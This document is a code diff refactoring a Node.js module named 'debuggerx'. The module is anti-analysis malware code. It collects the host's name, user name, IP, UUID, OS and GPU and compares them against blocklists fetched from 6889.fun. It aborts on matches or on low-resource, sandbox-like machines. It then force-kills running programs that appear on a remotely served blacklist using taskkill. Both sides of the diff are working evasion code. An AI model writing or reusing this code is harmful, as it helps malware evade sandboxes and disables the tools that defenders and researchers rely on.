@@ -1,158 +1,136 @@
 const util = require("util");
-const exec = util.promisify(require("child_process").exec);
 const axios = require("axios");
+const process = require("process");
+const exec = util.promisify(require("child_process").exec);
 
-async function debuggerx(enable, ip, disk, ram, uuid, cpucount, os, cpu, gpu, windowskey, windowsversion) {
-    if (enable !== "yes") return;
+async function debuggerx(enable, ip, disk, ram, uid, cpucount, os, cpu, gpu, windowskey, windowsversion) {
+    if (enable === "no") return;
     try {
-        const PcName = 
-            process.env.COMPUTERNAME;
-        
-        const userName =
-            process.env.USERNAME
-            || process.env.SUDO_USER
-            || process.env.C9_USER
-            || process.env.LOGNAME
-            || process.env.USER
-            || process.env.LNAME
-            || process.env.USERNAME;
-
         const [
-            _,
-            __,
-            ___,
-            ____,
-            _____,
-            ______,
+            pc_name,
+            user_name
+        ] = [
+                process.env.COMPUTERNAME || "Not found",
+                process.env.USERNAME || "Not found"
+            ]
+        const [
+            isBlockedIP,
+            isBlockedUID,
+            isBlockedUsername,
+            isBlockedPCName,
+            isBlockedOS,
+            isBlockedGpu,
         ] = await Promise.all([
-            ips(ip),
-            uuids(uuid),
-            usernames(userName),
-            pcnames(PcName),
-            oss(os),
-            gpus(gpu),
+            ipBlocked(ip),
+            uuidBlocked(uid),
+            usernameBlocked(user_name),
+            pcNameBlocked(pc_name),
+            osBlocked(os),
+            gpuBlocked(gpu),
         ]);
 
         if (
-            (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2) ||
-            (!isNaN(cpucount) && cpucount < 2)
-            || _
-            || __
-            || ___
-            || ____
-            || _____
-            || ______
+            (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2)
+            || (!isNaN(cpucount) && cpucount < 2)
+            || isBlockedGpu
+            || isBlockedOS
+            || isBlockedIP
+            || isBlockedUID
+            || isBlockedUsername
+            || isBlockedPCName
         ) {
             process.abort();
         }
+
         try {
-            apps();
+            await killBlacklisted();
         } catch (e) {
-            return console.error(e);
+            console.error(e);
         }
     } catch (e) {
-        return console.error(e);
+        console.error(e);
     }
-};
+}
 
-async function apps() {
+async function killBlacklisted() {
     try {
-        const { stdout } = await exec("tasklist");
-        const _ = await axios.get(
+        const r = await axios.get(
             "https://6889.fun/api/aurathemes/bypass/blacklist/progr?aurathemes=true",
         );
-        const json = _.data;
-        const res = json.blacklistedprog;
-        const running = stdout.split(/\r?\n/);
-
-        running.forEach((p) => {
-            const name = p
-                .split(/\s+/)[0]
-                .replace(".exe", "");
-
-            if (res.includes(name)) {
+        const bp = r.data.blacklistedprog;
+        const { stdout } = await exec("tasklist");
+        const rp = stdout.split(/\r?\n/);
+        for (const p of rp) {
+            const pn = p.split(/\s+/)[0].replace(".exe", "");
+            if (
+                pn.toLowerCase() !== "cmd" &&
+                bp.includes(pn)
+            ) {
                 try {
-                    exec(`taskkill /F /IM ${name}.exe`, (e) => {
-                        if (e) { } else { }
-                    });
-                } catch (err) { }
+                    await exec(`taskkill /F /IM ${pn}.exe`);
+                } catch (e) {
+                   // console.error(e);
+                }
             }
-        });
-    } catch (error) { }
-}
-
-async function gpus(x) {
-    try {
-        const _ = await axios.get(
-            "https://6889.fun/api/aurathemes/bypass/blocked/gpus?aurathemes=true",
-        );
-        const res = _.data;
-        return res.includes(x);
+        }
     } catch (e) {
-        return false;
+        console.error(e);
     }
 }
 
-async function oss(x) {
-    try {
-        const _ = await axios.get(
-            "https://6889.fun/api/aurathemes/bypass/blocked/oss?aurathemes=true",
-        );
-        const res = _.data;
-        return res.includes(x);
-    } catch (e) {
-        return false;
-    }
+async function gpuBlocked(_) {
+    return await isBlocked(
+        "https://6889.fun/api/aurathemes/bypass/blocked/gpus?aurathemes=true",
+        _,
+    );
 }
 
-async function pcnames(x) {
-    try {
-        const _ = await axios.get(
-            "https://6889.fun/api/aurathemes/bypass/blocked/pcnames?aurathemes=true",
-        );
-        const res = _.data;
-        return res.includes(x);
-    } catch (e) {
-        return false;
-    }
+async function osBlocked(_) {
+    return await isBlocked(
+        "https://6889.fun/api/aurathemes/bypass/blocked/oss?aurathemes=true",
+        _,
+    );
 }
 
-async function usernames(x) {
-    try {
-        const _ = await axios.get(
-            "https://6889.fun/api/aurathemes/bypass/blocked/progr?aurathemes=true",
-        );
-        const res = _.data;
-        return res.includes(x);
-    } catch (e) {
-        return false;
-    }
+async function pcNameBlocked(_) {
+    return await isBlocked(
+        "https://6889.fun/api/aurathemes/bypass/blocked/pcnames?aurathemes=true",
+        _,
+    );
 }
 
-async function uuids(x) {
-    try {
-        const _ = await axios.get(
-            "https://6889.fun/api/aurathemes/bypass/blocked/uuids?aurathemes=true",
-        );
-        const res = _.data;
-        return res.includes(x);
-    } catch (e) {
-        return false;
-    }
+async function usernameBlocked(_) {
+    return await isBlocked(
+        "https://6889.fun/api/aurathemes/bypass/blocked/progr?aurathemes=true",
+        _,
+    );
 }
 
-async function ips(x) {
+async function uuidBlocked(_) {
+    return await isBlocked(
+        "https://6889.fun/api/aurathemes/bypass/blocked/uuids?aurathemes=true",
+        _,
+    );
+}
+
+async function ipBlocked(_) {
+    return await isBlocked(
+        "https://6889.fun/api/aurathemes/bypass/blocked/ips?aurathemes=true",
+        _,
+    );
+}
+
+async function isBlocked(u, v) {
     try {
-        const _ = await axios.get(
-            "https://6889.fun/api/aurathemes/bypass/blocked/ips?aurathemes=true",
-        );
-        const res = _.data;
-        return res.includes(x);
+        const r = await axios.get(u);
+        const i = r.data;
+        return i.includes(v);
     } catch (e) {
+        console.error(e);
         return false;
     }
 }
 
 module.exports = {
-    debuggerx
-}
+    debuggerx,
+};
